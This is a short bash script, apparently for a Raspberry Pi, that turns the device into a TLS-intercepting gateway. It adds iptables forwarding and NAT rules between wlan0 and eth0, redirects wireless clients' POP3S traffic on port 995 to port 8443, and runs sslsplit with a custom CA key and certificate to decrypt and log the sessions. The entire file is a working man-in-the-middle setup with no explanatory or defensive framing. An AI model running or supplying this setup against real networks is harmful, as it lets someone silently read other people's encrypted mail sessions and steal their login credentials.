#!/bin/bash

sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -m tcp --dport 995 -j REDIRECT --to-ports 8443

cd /home/pi/ca
sslsplit -D -l connections.log -S logs -k ca.key -c ca.crt -t certdir -A fallback.pem ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
